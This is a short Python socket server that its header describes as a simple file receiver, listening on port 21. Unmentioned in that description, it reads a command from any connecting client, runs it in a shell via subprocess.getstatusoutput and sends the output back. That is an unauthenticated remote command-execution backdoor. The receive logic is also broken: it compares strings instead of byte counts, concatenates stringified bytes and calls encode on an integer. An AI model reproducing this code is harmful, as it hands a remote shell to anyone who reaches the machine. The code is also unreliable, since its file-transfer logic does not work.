
# *****************************************************
# This file implements a server for receiving the file
# sent using sendfile(). The server receives a file and
# prints it's contents.
# *****************************************************

import socket
import subprocess

# The port on which to listen
listenPort = 21

# Create a welcome socket. 
welcomeSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to the port
welcomeSock.bind(('', listenPort))

# Start listening on the socket
welcomeSock.listen(1)

# ************************************************
# Receives the specified number of bytes
# from the specified socket
# @param sock - the socket from which to receive
# @param numBytes - the number of bytes to receive
# @return - the bytes received
# *************************************************
def recvAll(sock: socket, numBytes):

	# The buffer
	recvBuff = ''
	
	# Keep receiving till all is received
	while recvBuff < str(numBytes):
		
		# Attempt to receive bytes
		tmpBuff = sock.recv(1024)
		
		# The other side has closed the socket
		if not tmpBuff:
			break
		
		# Add the received bytes to the buffer
		recvBuff += str(tmpBuff)
	
	return recvBuff
		
# Accept connections forever
while True:
	
	print("Waiting for connections...")
		
	# Accept connections
	clientSock, addr = welcomeSock.accept()
	
	print("Accepted connection from client: ", addr)
	print("\n")

	# Receive the first 10 bytes indicating the
	recBuff = b'0000000000'
	
	command = clientSock.recv(1024)

	for line in subprocess.getstatusoutput(command):
		clientSock.send(line.encode('utf-8'))

	# size of the file
	fileSizeBuff = recvAll(clientSock, recBuff)
		
	# Get the file size
	fileSize = fileSizeBuff
	
	print("The file size is ", fileSize)
	
	# Get the file data
	fileData = recvAll(clientSock, fileSize)
	
	print("The file data is: ")
	print(fileData)
		
	# Close our side
	clientSock.close()
	